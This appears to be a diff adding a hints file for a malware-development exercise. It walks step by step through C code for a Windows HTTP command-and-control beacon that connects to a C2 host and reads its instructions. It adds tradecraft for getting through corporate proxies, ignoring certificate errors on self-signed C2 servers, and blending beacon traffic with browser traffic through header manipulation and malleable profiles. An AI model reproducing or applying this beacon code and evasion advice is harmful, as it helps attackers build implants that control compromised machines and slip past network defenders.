@@ -1,0 +1,31 @@
+=== HINT 1: InternetOpen ===
+HINTERNET hInet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG,
+                                 NULL, NULL, 0);
+
+=== HINT 2: InternetConnect ===
+HINTERNET hConn = InternetConnectA(hInet, C2_HOST, C2_PORT,
+                                    NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+
+=== HINT 3: HttpOpenRequest ===
+HINTERNET hReq = HttpOpenRequestA(hConn, "GET", C2_PATH, NULL, NULL, NULL, 0, 0);
+
+=== HINT 4: HttpSendRequest + read ===
+BOOL sent = HttpSendRequestA(hReq, NULL, 0, NULL, 0);
+char buf[512] = {0};
+DWORD read = 0;
+InternetReadFile(hReq, buf, sizeof(buf)-1, &read);
+
+=== HINT 5: Cleanup (reverse order) ===
+InternetCloseHandle(hReq);
+InternetCloseHandle(hConn);
+InternetCloseHandle(hInet);
+
+=== KEY INSIGHT ===
+INTERNET_OPEN_TYPE_PRECONFIG reads the system/IE proxy settings automatically -
+important for beacons operating behind corporate proxies.
+For HTTPS: add INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID to
+HttpOpenRequestA flags (ignore cert errors for self-signed C2 certs).
+WinHTTP (winhttp.dll) is the modern alternative: doesn't use IE proxy settings,
+suitable for services/non-interactive processes.
+Real beacons add custom headers (User-Agent rotation, Host header manipulation,
+malleable C2 profiles) to blend with legitimate browser traffic.
